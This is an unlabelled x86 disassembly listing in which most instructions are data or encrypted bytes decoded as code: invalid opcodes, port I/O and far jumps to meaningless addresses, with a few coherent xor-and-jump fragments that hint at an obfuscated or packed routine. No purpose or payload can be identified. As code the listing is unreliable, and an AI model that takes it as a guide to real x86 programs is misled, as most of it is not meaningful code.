  4106c9:	(bad)  
  4106ca:	shl    BYTE PTR [ecx-0x60af7deb],1
  4106d0:	std    
  4106d1:	sub    eax,0xfcbec4d2
  4106d6:	xchg   edx,eax
  4106d7:	call   0xcb46:0xe1246e11
  4106de:	pop    esi
  4106df:	sbb    al,0x98
  4106e1:	pusha  
  4106e2:	out    dx,eax
  4106e3:	mov    ebp,0xf569f11e
  4106e8:	sbb    esi,DWORD PTR [edx-0x7712cee]
  4106ee:	dec    esi
  4106ef:	ficom  DWORD PTR [ebx-0x8714b7e]
  4106f5:	gs dec esp
  4106f7:	pop    esi
  4106f8:	shr    eax,0x66
  4106fb:	or     al,0xf6
  4106fd:	popa   
  4106fe:	xor    bh,BYTE PTR [esp+esi*4]
  410701:	test   al,0x67
  410703:	xor    ah,BYTE PTR [edi+0x48]
  410706:	mov    DWORD PTR [eax-0x3c],0x91c19382
  41070d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41070e:	stos   BYTE PTR es:[edi],al
  41070f:	inc    esp
  410710:	imul   ebp,DWORD PTR [edi],0xffffffd5
  410713:	and    ch,bl
  410715:	dec    ebx
  410716:	push   ss
  410717:	adc    cl,BYTE PTR [edx+esi*8-0x1a]
  41071b:	inc    ebp
  41071c:	lahf   
  41071d:	in     al,dx
  41071e:	fld    QWORD PTR [ebp-0x4d]
  410721:	push   ebp
  410722:	xor    ah,dh
  410724:	popf   
  410725:	fiadd  DWORD PTR [edx+0x2ac1d6e1]
  41072b:	mov    BYTE PTR [ecx],ch
  41072d:	out    dx,eax
  41072e:	ins    DWORD PTR es:[edi],dx
  41072f:	leave  
  410730:	js     0x410783
  410732:	jecxz  0x410751
  410734:	adc    DWORD PTR [esi-0x2ae9727e],edi
  41073a:	lods   eax,DWORD PTR ds:[esi]
  41073b:	jmp    0x410700
  41073d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41073e:	add    BYTE PTR [eax+0x6b],ch
  410741:	out    dx,eax
  410742:	xor    BYTE PTR [esi-0x59],0xfd
  410746:	std    
  410747:	adc    al,0x21
  410749:	popf   
  41074a:	shl    al,1
  41074c:	lods   al,BYTE PTR ds:[esi]
  41074d:	sbb    edx,DWORD PTR [edx+0x28]
  410750:	mov    dl,0x1f
  410752:	test   ebx,edx
  410754:	mov    esi,0xdc5d8544
  410759:	xlat   BYTE PTR ds:[ebx]
  41075a:	cdq    
  41075b:	pop    ss
  41075c:	mov    ebp,0x8e730453
  410761:	xchg   ah,dh
  410763:	fstp   QWORD PTR [ecx]
  410765:	pop    esi
  410766:	div    BYTE PTR [eax+0x2d356c78]
  41076c:	mov    ss,edi
  41076e:	mov    al,ds:0x9a5df533
  410773:	fs (bad) 
  410776:	push   ebp
  410777:	cmc    
  410778:	jb     0x4107c6
  41077a:	addr16 inc esi
  41077c:	int3   
  41077d:	test   DWORD PTR [ebx+0x15f61da9],eax
  410783:	and    BYTE PTR [eax],cl
  410785:	dec    eax
  410786:	mov    cl,0x1
  410788:	cmp    dh,ch
  41078a:	and    BYTE PTR [esi],0xd9
  41078d:	dec    ebx
  41078e:	add    BYTE PTR [eax*2+0x4262ec56],0x6b
  410796:	pop    esi
  410797:	push   esp
  410798:	cwde   
  410799:	push   ss
  41079a:	inc    ebp
  41079b:	adc    DWORD PTR [eax+ebx*2+0xe55de5f],eax
  4107a2:	test   BYTE PTR [esi],dl
  4107a4:	and    ebx,0x4e
  4107a7:	(bad)  
  4107a8:	hlt    
  4107a9:	xchg   edx,eax
  4107aa:	adc    bl,BYTE PTR [edx]
  4107ac:	dec    ebp
  4107ad:	shr    ch,cl
  4107af:	mov    ds:0xc6f54fac,al
  4107b4:	(bad)  [ecx+0x7f86353c]
  4107ba:	sub    ecx,esi
  4107bc:	dec    esp
  4107bd:	repnz mov al,0xda
  4107c0:	arpl   WORD PTR [edi-0x79412c6],sp
  4107c6:	or     cl,dh
  4107c8:	mov    WORD PTR [edx+0x68],gs
  4107cb:	shl    BYTE PTR [bx+di-0x16],0x7
  4107d0:	dec    ecx
  4107d1:	xchg   BYTE PTR [ebx+0x78],dh
  4107d4:	cmc    
  4107d5:	xor    esi,ebx
  4107d7:	fldenv [edi+0x76]
  4107da:	add    eax,0x108640ab
  4107df:	fld    TBYTE PTR [edi+0x8]
  4107e2:	mov    al,ds:0x2c4b0f89
  4107e7:	ret    
  4107e8:	cs mov bl,0xab
  4107eb:	data16 and al,0xbc
  4107ee:	mov    ah,0xd0
  4107f0:	or     al,0x81
  4107f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107f3:	das    
  4107f4:	jl     0x4107b5
  4107f6:	mov    BYTE PTR [eax],bh
  4107f8:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107fa:	sub    ebx,edi
  4107fc:	cmp    ebx,edx
  4107fe:	jmp    0x410a86
  410803:	into   
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	scas   al,BYTE PTR es:[edi]
  410810:	push   eax
  410811:	clc    
  410812:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	inc    ebp
  41081c:	mov    al,ds:0x12f41278
  410821:	push   eax
  410822:	shr    BYTE PTR [esi+0x62],0x99
  410826:	xchg   ebx,eax
  410827:	ret    0x364
  41082a:	push   esi
  41082b:	in     al,0xe1
  41082d:	int    0x69
  41082f:	jns    0x41089e
  410831:	repz push edi
  410833:	xchg   edx,eax
  410834:	(bad)  
  410836:	jnp    0x4107f4
  410838:	test   cl,al
  41083a:	test   ch,dh
  41083c:	adc    al,0x3a
  41083e:	shl    DWORD PTR [esp+esi*4+0x1391b092],cl
  410845:	dec    eax
  410846:	dec    ebx
  410847:	mov    eax,ds:0x968207c3
  41084c:	fnstcw WORD PTR [ecx+0x66e552e]
  410852:	leave  
  410853:	cmp    BYTE PTR [esi+0x2c71e95d],dl
  410859:	call   0x1306:0x1ea517e
  410860:	arpl   ax,di
  410862:	das    
  410863:	cwde   
  410864:	push   ecx
  410865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410866:	or     bh,BYTE PTR [ebp+0x2d]
  410869:	ja     0x4107f0
  41086b:	sbb    DWORD PTR [ecx-0x40d4cb87],eax
  410871:	mov    bh,0xf8
  410874:	test   al,0x49
  410876:	push   ebx
  410877:	add    DWORD PTR [eax+0xfbde7c6],edx
  41087d:	packuswb mm4,QWORD PTR [edi]
  410880:	mov    esp,0x2d5ff1d1
  410885:	fmul   QWORD PTR [ebx+eiz*2+0x3218b01f]
  41088c:	aaa    
  41088d:	pop    edi
  41088e:	mov    al,0x49
  410890:	sub    DWORD PTR [edi],eax
  410892:	cmp    eax,0x8a89ac89
  410897:	jae    0x41081d
  410899:	pushf  
  41089a:	mov    dl,BYTE PTR [edi]
  41089c:	or     ebx,DWORD PTR [edi]
  41089e:	aaa    
  41089f:	sub    ecx,ebp
  4108a1:	ss ss setp bl
  4108a6:	mov    al,dh
  4108a8:	mov    ecx,0xb372e344
  4108ad:	shl    BYTE PTR [esp+eax*4+0x43],1
  4108b1:	mov    WORD PTR [ebx+0x6c],es
  4108b4:	imul   dh
  4108b6:	(bad)  
  4108b8:	xchg   esp,eax
  4108b9:	fadd   DWORD PTR [esi+0x59]
  4108bc:	sbb    bl,BYTE PTR [ecx+ebp*1+0x25]
  4108c0:	mov    edx,0xe5ac18ca
  4108c5:	fwait
  4108c6:	aam    0xc5
  4108c8:	push   ss
  4108c9:	mov    al,0x92
  4108cb:	icebp  
  4108cc:	inc    ecx
  4108cd:	jg     0x41090d
  4108cf:	repnz aaa 
  4108d1:	mov    ebx,0x827e041c
  4108d6:	push   ebp
  4108d7:	jge    0x41090e
  4108d9:	xchg   edi,eax
  4108da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108db:	fimul  DWORD PTR [edi]
  4108dd:	mov    ds:0x64a9cfce,al
  4108e2:	adc    al,0x16
  4108e4:	or     eax,0xff30f1c7
  4108e9:	jl     0x4108f7
  4108eb:	fucomip st,st(7)
  4108ed:	daa    
  4108ee:	mov    ch,0x43
  4108f0:	xchg   ebp,eax
  4108f1:	in     al,0x21
  4108f3:	add    bh,ah
  4108f5:	mov    esi,0x8811bcec
  4108fa:	pop    esp
  4108fb:	jg     0x4108ef
  4108fd:	ss pop ebx
  4108ff:	adc    al,0x2e
  410901:	(bad)  
  410903:	shl    DWORD PTR [edx],0xd8
  410906:	pop    esi
  410907:	rcl    DWORD PTR [ebp+eax*2-0x3f],cl
  41090b:	fsub   DWORD PTR [eax+0x5bde5179]
  410911:	or     al,0x83
  410913:	mov    dl,0xa1
  410915:	mov    ch,bl
  410917:	scas   eax,DWORD PTR es:[edi]
  410918:	sub    al,0x83
  41091a:	shr    DWORD PTR [ecx],1
  41091c:	test   BYTE PTR [ebp+0x23f686b5],0xa0
  410923:	dec    eax
  410924:	push   eax
  410925:	ret    0x426b
  410928:	aad    0x7c
  41092a:	xor    ecx,edi
  41092c:	sar    BYTE PTR [esi+0x6c],0x28
  410930:	mov    eax,DWORD PTR [edx-0x18]
  410933:	inc    eax
  410934:	les    edx,FWORD PTR [ecx-0x2a]
  410937:	stos   DWORD PTR es:[edi],eax
  410938:	(bad)  
  410939:	cmp    al,0x82
  41093b:	loop   0x4108dc
  41093d:	pop    ebp
  41093e:	aad    0x9
  410940:	fsubr  st(2),st
  410942:	jo     0x410928
  410944:	rcr    DWORD PTR [bx+si-0xc],0xba
  410949:	xor    ebp,DWORD PTR [eax+edi*1-0x3b5e2a66]
  410950:	pop    edx
  410951:	inc    ecx
  410952:	(bad)  
  410953:	lods   al,BYTE PTR ds:[esi]
  410954:	outs   dx,DWORD PTR fs:[esi]
  410956:	sbb    BYTE PTR [ebx],cl
  410958:	outs   dx,DWORD PTR ds:[esi]
  410959:	xor    DWORD PTR [esi],0xfffffffc
  41095c:	call   0x91e3:0x1e32690a
  410963:	xor    ch,bh
  410965:	jno    0x41095d
  410967:	mov    ecx,0x8533e062
  41096c:	fcom   DWORD PTR [eax-0x3160d8aa]
  410972:	adc    DWORD PTR [eax],esp
  410974:	pop    es
  410975:	sbb    DWORD PTR [eax-0x53],esp
  410978:	out    0x4f,al
  41097a:	in     eax,0x22
  41097c:	cdq    
  41097d:	pop    esi
  41097e:	daa    
  41097f:	and    esi,edi
  410981:	(bad)  
  410982:	out    0xc1,eax
  410984:	xchg   edi,eax
  410985:	pop    ss
  410986:	jns    0x410908
  410988:	loope  0x410a07
  41098a:	bound  edx,QWORD PTR [edi+edx*8+0x17]
  41098e:	rcl    DWORD PTR [esi-0x1e530613],1
  410994:	dec    edx
  410995:	mov    ecx,0xf622359a
  41099a:	jmp    0x8d26:0x8ded5bfd
  4109a1:	inc    edx
  4109a2:	mov    dl,0xe
  4109a4:	mov    eax,0x84e32a0
  4109a9:	xor    BYTE PTR [esi-0x6f],ah
  4109ac:	das    
  4109ad:	mov    al,dh
  4109af:	rol    BYTE PTR fs:[ecx+0x49beeb23],cl
  4109b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109b7:	push   0x2d
  4109b9:	scas   al,BYTE PTR es:[edi]
  4109ba:	xchg   ebp,eax
  4109bb:	mov    esi,0x821b9111
  4109c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109c1:	xchg   esi,eax
  4109c2:	pop    esp
  4109c3:	inc    eax
  4109c4:	pop    es
  4109c5:	and    BYTE PTR [edx],al
  4109c7:	(bad)  
  4109c8:	pop    es
  4109c9:	inc    esp
  4109ca:	lods   al,BYTE PTR ds:[esi]
  4109cb:	lea    esp,[ebp+0x7e]
  4109ce:	cwde   
  4109cf:	jp     0x4109ae
  4109d1:	sbb    dh,BYTE PTR [edi-0x6f]
  4109d4:	aam    0x6e
  4109d6:	xchg   ebx,eax
  4109d7:	jp     0x410975
  4109d9:	dec    ecx
  4109da:	mov    esi,esp
  4109dc:	test   al,0x3e
  4109de:	sbb    eax,0xe607cd7d
  4109e3:	iret   
  4109e4:	int3   
  4109e5:	push   esp
  4109e6:	sahf   
  4109e7:	fdiv   QWORD PTR [edi-0x30ddd3b8]
  4109ed:	inc    ecx
  4109ee:	fidiv  DWORD PTR [ecx]
  4109f0:	xchg   ebx,eax
  4109f1:	jp     0x410a19
  4109f3:	push   cs
  4109f4:	rol    BYTE PTR gs:[esi+0x18323d6f],0x52
  4109fc:	sbb    ebx,esp
  4109fe:	test   al,0xd1
  410a00:	outs   dx,BYTE PTR ds:[esi]
  410a01:	es and ah,dh
  410a04:	jge    0x4109ad
  410a06:	leave  
  410a07:	shl    DWORD PTR [esi],1
  410a09:	xor    esp,eax
  410a0b:	push   0xab9fcd0a
  410a10:	ins    BYTE PTR es:[edi],dx
  410a11:	pop    ds
  410a12:	xchg   ebp,eax
  410a13:	jge    0x4109e0
  410a15:	and    ecx,DWORD PTR [eax-0x5a]
  410a18:	test   eax,0x8f666ebb
  410a1d:	add    al,cl
  410a1f:	add    eax,0x8ec83418
  410a24:	fist   WORD PTR [ecx-0x5f726cb4]
  410a2a:	adc    eax,esp
  410a2c:	push   eax
  410a2d:	adc    esp,DWORD PTR [ebp+0x56]
  410a30:	push   0x9efae47b
  410a35:	jbe    0x410a71
  410a37:	fs or  dl,bl
  410a3a:	sbb    al,0xc8
  410a3c:	jl     0x410a87
  410a3e:	jl     0x410ab4
  410a40:	push   edi
  410a41:	pop    ebx
  410a42:	cs dec ecx
  410a44:	mov    al,ds:0x9c981e98
  410a49:	cmp    DWORD PTR [edx+0x317cf8d6],ebp
  410a4f:	in     eax,dx
  410a50:	test   al,0x87
  410a52:	stc    
  410a53:	jecxz  0x410ab2
  410a55:	sbb    DWORD PTR [edx],ecx
  410a57:	pop    esp
  410a58:	in     al,dx
  410a59:	lods   eax,DWORD PTR ds:[esi]
  410a5a:	mov    cl,bh
  410a5c:	fild   QWORD PTR [ebp-0x2e]
  410a5f:	jns    0x410a93
  410a61:	mov    bl,0x28
  410a63:	in     eax,0xe4
  410a65:	mov    eax,ds:0xe55deb17
  410a6a:	inc    ebx
  410a6b:	push   ss
  410a6c:	adc    eax,0x1f30e9cd
  410a71:	mov    edx,0xc6a6d12b
  410a76:	push   esp
  410a77:	pop    edx
  410a78:	mov    ch,0xa4
  410a7a:	fld    TBYTE PTR [eax-0x6a]
  410a7d:	pushf  
  410a7e:	in     al,0xf4
  410a80:	aas    
  410a81:	cmp    bl,BYTE PTR [eax+0x1]
  410a84:	jecxz  0x410a6e
  410a86:	ja     0x410a94
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	neg    DWORD PTR [edi]
  410ab0:	push   cs
  410ab1:	in     eax,dx
  410ab2:	stc    
  410ab3:	adc    edx,DWORD PTR [esi+0x78]
  410ab6:	js     0x410a9d
  410ab8:	jle    0x410b32
  410aba:	js     0x410a48
  410abc:	or     ebx,DWORD PTR [esi+0x24b31183]
  410ac2:	pop    DWORD PTR [edx-0x1c63f03d]
  410ac8:	and    BYTE PTR [edi-0x14],0x6d
  410acc:	add    ch,BYTE PTR [edx-0x283d7538]
  410ad2:	in     eax,dx
  410ad3:	std    
  410ad4:	dec    ebp
  410ad5:	cld    
  410ad6:	cmp    ecx,DWORD PTR cs:[ebx+ebp*8]
  410ada:	shr    BYTE PTR [eax],1
  410adc:	mov    ecx,0xd384160a
  410ae1:	fdivrp st(1),st
  410ae3:	iret   
  410ae4:	pop    ds
  410ae5:	xchg   DWORD PTR [ecx],esp
  410ae7:	imul   edi,edx,0xffffffa8
  410aea:	shl    DWORD PTR [edi+ecx*1+0x3522d1d0],1
  410af1:	fwait
  410af2:	add    eax,0xca1b5508
  410af7:	xor    al,0xd9
  410af9:	stos   DWORD PTR es:[edi],eax
  410afa:	mov    ecx,0x6c64f473
  410aff:	and    DWORD PTR [esi-0x3f],0x8466a473
  410b06:	loop   0x410b82
  410b08:	or     eax,0xeff62562
  410b0d:	cmp    ebx,edx
  410b0f:	mov    ah,BYTE PTR [ecx*1-0x404b8550]
  410b16:	jb     0x410aae
  410b18:	xchg   cl,ch
  410b1a:	pusha  
  410b1b:	int3   
  410b1c:	sbb    eax,0xa2540087
  410b21:	adc    al,0x96
  410b23:	rcl    BYTE PTR [eax-0x72],0x98
  410b27:	and    al,0x86
  410b29:	fistp  DWORD PTR [ebp-0x2c5b1bf3]
  410b2f:	pop    ecx
  410b30:	jae    0x410af8
  410b32:	mov    dl,0x31
  410b34:	adc    eax,0xfcdab050
  410b39:	not    BYTE PTR [ebp-0x1bef4a4c]
  410b3f:	mov    ah,0xc2
  410b41:	jbe    0x410b1c
  410b43:	jmp    0xf209:0x3582d99e
  410b4a:	call   0x39dc:0xd1d1a7f9
  410b51:	test   BYTE PTR [ecx],cl
  410b53:	add    esp,DWORD PTR [ebp-0x253811f8]
  410b59:	pusha  
  410b5a:	ror    ah,1
  410b5c:	jp     0x410bd0
  410b5e:	jecxz  0x410b10
  410b60:	sahf   
  410b61:	iret   
  410b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b63:	push   edx
  410b64:	add    eax,0xe203b257
  410b69:	ins    BYTE PTR es:[edi],dx
  410b6a:	pop    esi
  410b6b:	imul   edx,eax,0x6b
  410b6e:	jmp    0x410ba8
  410b70:	pop    eax
  410b71:	or     DWORD PTR [edi-0x79],ebx
  410b74:	imul   ecx,DWORD PTR [eax+ebp*8-0x722741f6],0x2158f22b
  410b7f:	sub    ebx,DWORD PTR [edx+0x38]
  410b82:	jo     0x410b89
  410b84:	mov    ch,0x1c
  410b86:	(bad)
  410b89:	dec    edi
  410b8a:	add    al,0xba
  410b8c:	mov    ebp,0xcb6c7224
  410b91:	scas   al,BYTE PTR es:[edi]
  410b92:	in     al,dx
  410b93:	or     esi,edi
  410b95:	shl    BYTE PTR [ebx+0x26494188],cl
  410b9b:	inc    edx
  410b9c:	cmp    ebx,DWORD PTR ds:[ebp+0x34]
  410ba0:	and    bl,BYTE PTR ds:0x979f6277
  410ba6:	add    bh,BYTE PTR [eiz*8-0x4fad1d2f]
  410bad:	lahf   
  410bae:	iret   
  410baf:	idiv   BYTE PTR [ebp-0x56d5c6f0]
  410bb5:	jg     0x410c00
  410bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb8:	loop   0x410b56
  410bba:	dec    edi
  410bbb:	icebp  
  410bbc:	pop    eax
  410bbd:	cdq    
  410bbe:	push   ecx
  410bbf:	stos   BYTE PTR es:[edi],al
  410bc0:	cdq    
  410bc1:	jge    0x410bbd
  410bc3:	sub    BYTE PTR [ebx],dl
  410bc5:	aad    0xe2
  410bc7:	and    BYTE PTR [eax],dh
  410bc9:	push   esp
  410bca:	mov    WORD PTR [eax+0x20],fs
  410bcd:	mov    ecx,0xf472c397
  410bd2:	push   ss
  410bd3:	jmp    0x410bd5
  410bd5:	sub    ebx,DWORD PTR [ebx+esi*4-0x53]
  410bd9:	cmp    BYTE PTR [ebp-0x28],al
  410bdc:	shr    DWORD PTR [esi],1
  410bde:	push   0xc948b0e2
  410be3:	icebp  
  410be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410be6:	daa    
  410be7:	mov    bl,0xfa
  410be9:	lock dec esi
  410beb:	nop
  410bec:	jnp    0x410c0b
  410bee:	ins    DWORD PTR es:[edi],dx
  410bef:	push   ecx
  410bf0:	clc    
  410bf1:	(bad)  [eax+edi*4+0x691faa2]
  410bf8:	inc    eax
  410bf9:	dec    esi
  410bfa:	xor    DWORD PTR [ecx+edi*2],ecx
  410bfd:	sub    cl,ah
  410bff:	dec    esi
  410c00:	mov    edx,0xd6b4868d
  410c05:	mov    eax,ds:0x16f9afef
  410c0a:	scas   eax,DWORD PTR es:[edi]
  410c0b:	xor    ah,BYTE PTR [ebp-0x185efc8b]
  410c11:	arpl   WORD PTR [edi+0x7c992fb3],bp
  410c17:	mov    dh,0x82
  410c19:	(bad)  
  410c1a:	jo     0x410c77
  410c1c:	cmc    
  410c1d:	mov    bl,cl
  410c1f:	popf   
  410c20:	lods   al,BYTE PTR ds:[esi]
  410c21:	adc    eax,0xe6fe732c
  410c26:	jo     0x410bf9
  410c28:	and    esi,DWORD PTR [ebp+0xe]
  410c2b:	out    0x9c,eax
  410c2d:	push   esp
  410c2e:	aaa    
  410c2f:	daa    
  410c30:	fmul   st(4),st
  410c32:	push   eax
  410c33:	cmp    eax,0xe073e63b
  410c38:	lds    esp,FWORD PTR [edi-0x2e]
  410c3b:	mov    ecx,DWORD PTR [ebx-0x39]
  410c3e:	mov    ah,0x3b
  410c40:	inc    esp
  410c41:	inc    ebp
  410c42:	add    eax,0xbef9e418
  410c47:	adc    eax,0x4ae339e8
  410c4c:	pop    esi
  410c4d:	cmp    al,0x3a
  410c4f:	push   0xffffffab
  410c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c52:	mov    dh,0x3a
  410c54:	je     0x410cb9
  410c56:	fidiv  DWORD PTR [ecx]
  410c58:	sub    ecx,0x2d
  410c5b:	idiv   BYTE PTR [esi+0xae2bead]
  410c61:	imul   ebp,DWORD PTR [esi-0xa],0xffffffb4
  410c65:	xchg   ecx,eax
  410c66:	mov    edi,0x8b115c9d
  410c6b:	fwait
  410c6c:	xor    eax,edx
  410c6e:	add    bl,dh
  410c70:	jle    0x410c89
  410c72:	or     DWORD PTR [esi-0x57],eax
  410c75:	out    dx,al
  410c76:	jg     0x410c05
  410c78:	sub    eax,0x985e7528
  410c7d:	imul   esp,DWORD PTR [ecx],0xffffff85
  410c80:	cmp    bh,0x35
  410c83:	lea    ebx,[edx+0x23]
  410c86:	jge    0x410cde
  410c88:	fdivr  QWORD PTR [eax-0x3d]
  410c8b:	ja     0x410c1f
  410c8d:	jo     0x410c69
  410c8f:	xor    eax,0x2934670f
  410c94:	cmp    BYTE PTR [ecx+0x9bd6fd5],cl
  410c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c9b:	cmpps  xmm7,xmm4,0x2c
  410c9f:	std    
  410ca0:	xchg   edi,eax
  410ca1:	loop   0x410d17
  410ca3:	mov    ecx,0x8ca8f7d9
  410ca8:	or     al,0x68
  410caa:	cli    
  410cab:	pop    ebx
  410cac:	and    al,0xf1
  410cae:	xchg   edi,eax
  410caf:	cmp    BYTE PTR [esi-0x46],ch
  410cb2:	mov    edi,0xb650b4e6
  410cb7:	cs mov edi,0x3441d1ed
  410cbd:	imul   edi,ebp,0xa9df35e6
  410cc3:	daa    
  410cc4:	cmc    
  410cc5:	pusha  
  410cc6:	jmp    0xd3fc:0x7d773d21
  410ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cce:	imul   esp,DWORD PTR [ebp-0x4602a6cd],0x5b
  410cd5:	fldenv [edi+ebp*1-0x38ca200a]
  410cdc:	outs   dx,DWORD PTR ds:[esi]
  410cdd:	cmc    
  410cde:	sahf   
  410cdf:	or     eax,0xcbbb37e1
  410ce4:	repnz dec edx
  410ce6:	dec    esi
  410ce7:	push   es
  410ce8:	mov    ebx,es
  410cea:	push   0xffffffd1
  410cec:	aad    0x75
  410cee:	les    ebp,FWORD PTR [ecx+0x502fc66d]
  410cf4:	mov    ah,0xa0
  410cf6:	adc    edi,0x4f6e05c
  410cfc:	fsubr  DWORD PTR [eax]
  410cfe:	push   esp
  410cff:	in     eax,0xf6
  410d01:	mov    ebp,0xe9020ab
  410d06:	jl     0x410c8c
  410d08:	aas    
  410d09:	xchg   ebp,eax
  410d0a:	lods   eax,DWORD PTR ds:[esi]
  410d0b:	jmp    0xa4bf7291
  410d10:	mov    eax,ds:0x57b09a5c
  410d15:	xor    edx,DWORD PTR [edx]
  410d17:	jmp    0x3283e4b
  410d1c:	pop    es
  410d1d:	call   0x21:0x4b774b0c
  410d24:	mov    ds:0x3f903f3,eax
  410d29:	ror    DWORD PTR [edi],1
  410d2b:	scas   eax,DWORD PTR es:[edi]
  410d2c:	xlat   BYTE PTR ds:[ebx]
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	(bad)  
  410d61:	(bad)  
  410d63:	sbb    bh,al
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	mov    BYTE PTR [edx],ah
  410d6e:	repnz popa 
  410d70:	test   DWORD PTR [esi-0x23fcf7ef],0xaee77c45
  410d7a:	or     al,0x9d
  410d7c:	sub    esi,DWORD PTR [ecx-0x5e]
  410d7f:	mov    ?,WORD PTR [esp+ebp*2+0x75]
  410d83:	outs   dx,BYTE PTR ds:[esi]
  410d84:	loop   0x410d14
  410d86:	push   ebp
  410d87:	imul   edi,ebx,0xeed6e087
  410d8d:	mov    ebx,0x9c370bd6
  410d92:	ja     0x410d41
  410d94:	xchg   ebp,eax
  410d95:	xor    ch,ah
  410d97:	mov    al,BYTE PTR [esi+eiz*4-0x74]
  410d9b:	jg     0x410e16
  410d9d:	inc    ecx
  410d9e:	inc    ecx
  410d9f:	aas    
  410da0:	(bad)  
  410da1:	in     al,dx
  410da2:	shl    BYTE PTR [edx-0x8d1ddd4],cl
  410da8:	aam    0x9f
  410daa:	push   0x25f1ec46
  410daf:	popa   
  410db0:	outs   dx,DWORD PTR ds:[esi]
  410db1:	mov    WORD PTR [esp+edi*1+0x760c4143],cs
  410db8:	daa    
  410db9:	les    ebx,FWORD PTR [esi]
  410dbb:	into   
  410dbc:	and    ah,BYTE PTR [ecx]
  410dbe:	sub    al,0x49
  410dc0:	sbb    BYTE PTR [ecx+edx*4+0x2ead3967],dh
  410dc7:	add    dh,BYTE PTR [edx-0x6]
  410dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dcb:	fyl2xp1 
  410dcd:	sti    
  410dce:	mov    ch,0x9c
  410dd0:	aam    0xf7
  410dd2:	push   ss
  410dd3:	cmp    esi,DWORD PTR [ebp+esi*1+0x5aad359b]
  410dda:	mov    ebx,0xf23d86
  410ddf:	in     eax,0x2d
  410de1:	jae    0x410dbf
  410de3:	add    al,0x2c
  410de5:	sbb    dh,BYTE PTR [ecx+0x41]
  410de8:	mov    ecx,0x565f789b
  410ded:	xchg   edi,ebp
  410def:	xor    ebp,DWORD PTR [ebp-0xf]
  410df2:	nop
  410df3:	push   0x12f0312
  410df8:	bound  ecx,QWORD PTR cs:[ebp-0x35]
  410dfc:	mov    BYTE PTR [edx-0x39],ah
  410dff:	sub    esi,DWORD PTR [edx]
  410e01:	clc    
  410e02:	xor    al,0x38
  410e04:	in     al,0xc0
  410e06:	pusha  
  410e07:	jbe    0x410dcb
  410e09:	les    esp,FWORD PTR [ecx-0x44]
  410e0c:	fistp  QWORD PTR ds:0xbb7e4348
  410e12:	mov    bl,0xcc
  410e14:	ficom  WORD PTR [edx+0x2e192754]
  410e1a:	pop    edx
  410e1b:	imul   edi,DWORD PTR [ebx-0x20],0xb0cb1d75
  410e22:	mov    WORD PTR [edi],cs
  410e24:	icebp  
  410e25:	sahf   
  410e26:	in     al,0xef
  410e28:	dec    eax
  410e29:	out    0x5b,eax
  410e2b:	adc    eax,0xc5365186
  410e30:	xchg   edi,eax
  410e31:	mov    edx,0x60d7aa57
  410e37:	jecxz  0x410eb5
  410e39:	inc    edi
  410e3a:	xor    al,0x88
  410e3c:	mov    bl,0x4a
  410e3e:	mov    eax,ds:0x32092194
  410e43:	rcr    DWORD PTR [ecx-0x77],0x98
  410e47:	mov    WORD PTR [ecx],?
  410e49:	ds pop ss
  410e4b:	repz adc DWORD PTR [ebx+0x2362ecae],ecx
  410e52:	in     eax,0x53
  410e54:	pop    esp
  410e55:	fisttp QWORD PTR [eax]
  410e57:	mov    al,0x2a
  410e59:	enter  0xf9ff,0x82
  410e5d:	push   ebx
  410e5e:	imul   ecx,DWORD PTR [ebx],0x47
  410e61:	sbb    al,0xd8
  410e63:	dec    ebp
  410e64:	add    ch,BYTE PTR [edx+ebx*4-0x48cd7962]
  410e6b:	test   eax,ebp
  410e6d:	jle    0x410ebb
  410e6f:	mov    ch,0x4
  410e71:	bound  edi,QWORD PTR [edx-0x7d2417aa]
  410e77:	jb     0x410e4d
  410e79:	xchg   esi,eax
  410e7a:	jmp    0x410e0a
  410e7c:	add    al,0x47
  410e7e:	push   ecx
  410e7f:	xchg   esp,eax
  410e80:	lea    ebp,[edi-0x505a8ec2]
